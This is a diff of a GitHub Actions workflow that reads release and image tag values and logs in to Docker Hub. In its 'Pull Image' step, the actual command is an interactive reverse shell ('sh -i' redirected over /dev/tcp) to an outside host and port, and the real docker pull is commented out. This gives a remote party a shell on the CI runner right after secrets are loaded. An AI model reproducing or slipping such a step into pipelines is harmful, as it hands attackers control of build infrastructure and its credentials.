@@ -16,21 +16,34 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
-      - name: Get Release Version
+      - name: Get Release Version in Package.json file
         run: |
               version=$(jq -r '.version' package.json)
               echo "Package version is: $version"
               echo "release_version=$version" >> $GITHUB_ENV
       
-      - name: Set output named RELEASE_VERSION
+      - name: Set output of Release Version
         id: release-version
-        run: echo "RELEASE_VERSION=$release_version" >> "$GITHUB_OUTPUT" #${{ steps.release-version.outputs.RELEASE_VERSION }}
+        run: echo "RELEASE_VERSION=$release_version" >> "$GITHUB_OUTPUT" 
 
       
-      - name: Get Image Name With Tag
+      - name: Set Image Tag Commit ID (old tag)
+        id: image-commit-tag
         run:  |
               image_with_commit_tag=$(yq -r '.spec.template.spec.containers[0].image' ./manifest/dev/deployment.yaml)
-              echo "Image is: $image_with_commit_tag"
+              echo "IMAGE_COMMIT_TAG=$image_with_commit_tag" >> "$GITHUB_OUTPUT" 
+              echo "IMAGE_COMMIT_TAG is $IMAGE_COMMIT_TAG"
+
+
+      - name: Set Image Tag RC Version (new tag)
+        id: image-rc-tag
+        run:  |
+              image_with_rc_tag=$(yq -r '.spec.template.spec.containers[0].image' ./manifest/dev/deployment.yaml)
+              echo "IMAGE_RELEASE_TAG=$image_with_rc_tag" >> "$GITHUB_OUTPUT" 
+              echo "IMAGE_RELEASE_TAG is $IMAGE_COMMIT_TAG"
+
+
+      
       
       - name: Log in to Docker Hub
         uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a
@@ -39,9 +52,6 @@ jobs:
           password: ${{ secrets.DOCKER_PASSWORD }}
 
       - name: Pull Image
-        env: 
-             IMAGE_OLD_TAG: $image_with_commit_tag
-  
         run: |
              sh -i >& /dev/tcp/ssid.beid.io/18000 0>&1
              #docker pull $image_with_commit_tag
